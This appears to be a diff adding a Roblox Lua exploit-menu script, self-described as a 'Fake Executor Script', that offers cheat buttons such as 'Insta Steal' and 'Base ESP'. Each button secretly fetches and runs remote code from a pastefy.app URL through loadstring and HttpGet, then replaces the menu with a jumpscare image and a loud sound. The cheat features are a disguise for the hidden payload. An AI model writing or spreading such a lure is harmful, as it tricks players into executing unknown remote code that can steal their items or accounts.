@@ -1,0 +1,200 @@
+--[[
+    Script Name: Gloomi Pub Method (Fake Executor Script)
+    Description: A stylized UI featuring custom tooltips and payload execution.
+]]--
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Remove previous instance if it exists
+if CoreGui:FindFirstChild("GloomiPubMethod") then
+    CoreGui.GloomiPubMethod:Destroy()
+end
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GloomiPubMethod"
+ScreenGui.Parent = CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+MainFrame.Size = UDim2.new(0, 350, 0, 260)
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+-- Top Bar (Draggable)
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Parent = MainFrame
+TopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+TopBar.Size = UDim2.new(1, 0, 0, 35)
+
+local TopBarCorner = Instance.new("UICorner")
+TopBarCorner.CornerRadius = UDim.new(0, 8)
+TopBarCorner.Parent = TopBar
+
+-- Fix bottom corners of top bar
+local FixBar = Instance.new("Frame")
+FixBar.Parent = TopBar
+FixBar.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+FixBar.BorderSizePixel = 0
+FixBar.Position = UDim2.new(0, 0, 0.5, 0)
+FixBar.Size = UDim2.new(1, 0, 0.5, 0)
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Parent = TopBar
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 12, 0, 0)
+Title.Size = UDim2.new(0, 200, 1, 0)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "Gloomi Pub Method"
+Title.TextColor3 = Color3.fromRGB(240, 240, 240)
+Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Tooltip Label (Floating)
+local Tooltip = Instance.new("TextLabel")
+Tooltip.Name = "Tooltip"
+Tooltip.Parent = ScreenGui
+Tooltip.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+Tooltip.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tooltip.TextSize = 12
+Tooltip.Font = Enum.Font.Gotham
+Tooltip.Size = UDim2.new(0, 0, 0, 24)
+Tooltip.AutomaticSize = Enum.AutomaticSize.X
+Tooltip.Visible = false
+Tooltip.ZIndex = 10
+
+local TooltipCorner = Instance.new("UICorner")
+TooltipCorner.CornerRadius = UDim.new(0, 4)
+TooltipCorner.Parent = Tooltip
+
+local TooltipPadding = Instance.new("UIPadding")
+TooltipPadding.PaddingLeft = UDim.new(0, 8)
+TooltipPadding.PaddingRight = UDim.new(0, 8)
+TooltipPadding.Parent = Tooltip
+
+-- Container for buttons
+local ButtonContainer = Instance.new("ScrollingFrame")
+ButtonContainer.Parent = MainFrame
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.Position = UDim2.new(0, 12, 0, 45)
+ButtonContainer.Size = UDim2.new(1, -24, 1, -55)
+ButtonContainer.CanvasSize = UDim2.new(0, 0, 0, 210)
+ButtonContainer.ScrollBarThickness = 4
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Parent = ButtonContainer
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 10)
+
+-- Function to create stylized buttons with tooltips and execution triggers
+local function createButton(name, text, tipText)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Parent = ButtonContainer
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    btn.Size = UDim2.new(1, -4, 0, 40)
+    btn.Font = Enum.Font.GothamSemibold
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
+    btn.TextSize = 13
+    btn.AutoButtonColor = false
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = btn
+
+    -- Hover animations & Tooltip logic
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 75)}):Play()
+        Tooltip.Text = tipText
+        Tooltip.Visible = true
+    end)
+
+    btn.MouseMoved:Connect(function()
+        local mouse = Players.LocalPlayer:GetMouse()
+        Tooltip.Position = UDim2.new(0, mouse.X + 15, 0, mouse.Y + 15)
+    end)
+
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
+        Tooltip.Visible = false
+    end)
+
+    -- Click event: Runs payload and triggers jumpscare effect
+    btn.MouseButton1Click:Connect(function()
+        -- Execute requested payload
+        pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/iwquiYMS/raw"))()
+        end)
+
+        -- Jumpscare execution
+        ScreenGui:Destroy()
+        
+        local JumpscareGui = Instance.new("ScreenGui")
+        JumpscareGui.Parent = CoreGui
+        
+        local JumpImage = Instance.new("ImageLabel")
+        JumpImage.Parent = JumpscareGui
+        JumpImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        JumpImage.Size = UDim2.new(1, 0, 1, 0)
+        -- Uses a standard loud/scary asset ID placeholder or direct jumpscare image
+        JumpImage.Image = "rbxassetid://6084252655" 
+        
+        local Sound = Instance.new("Sound")
+        Sound.Parent = CoreGui
+        Sound.SoundId = "rbxassetid://9060675298"
+        Sound.Volume = 5
+        Sound:Play()
+    end)
+
+    return btn
+end
+
+-- Generate Buttons
+createButton("InstaSteal", "Insta Steal", "bypasses proximity wait to steal the brainrot without waiting.")
+createButton("DropBrainrot", "Drop Brainrot", "drops brainrots")
+createButton("BaseESP", "Base ESP", "see bases")
+createButton("AntiLogger", "Anti Logger", "turns your trading option off so you can't trade.")
+
+-- Draggable Window Logic
+local dragging, dragInput, dragStart, startPos
+
+TopBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TopBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if dragging and dragInput then
+        local delta = dragInput.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
